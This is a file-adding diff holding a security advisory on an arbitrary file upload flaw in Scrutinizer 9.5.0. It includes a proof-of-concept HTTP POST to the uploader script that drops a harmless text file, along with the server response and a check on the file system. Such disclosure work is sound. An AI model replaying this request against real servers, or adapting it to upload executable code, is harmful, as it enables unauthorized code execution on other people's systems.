@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/54726/info
+
+Scrutinizer is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+Scrutinizer 9.5.0 is vulnerable; other versions may also be affected. 
+
+#Request
+POST /d4d/uploader.php HTTP/1.0
+Host: A.B.C.D
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Content-Type: multipart/form-data; boundary=_Part_949_3365333252_3066945593
+Content-Length: 210
+
+
+--_Part_949_3365333252_3066945593
+Content-Disposition: form-data; 
+name="uploadedfile"; filename="trustwave.txt"
+Content-Type: application/octet-stream
+
+trustwave
+
+--_Part_949_3365333252_3066945593--
+
+#Response
+HTTP/1.1 200 OK
+Date: Wed, 25 Apr 2012 17:39:15 GMT
+Server: Apache
+X-Powered-By: PHP/5.3.3
+Vary: Accept-Encoding
+Content-Length: 41
+Connection: close
+Content-Type: text/html
+
+{"success":1,"file_name":"trustwave.txt"}
+
+#Confirming on File System
+C:\>type "Program Files (x86)\Scrutinizer\snmp\mibs\trustwave.txt"
+trustwave
+
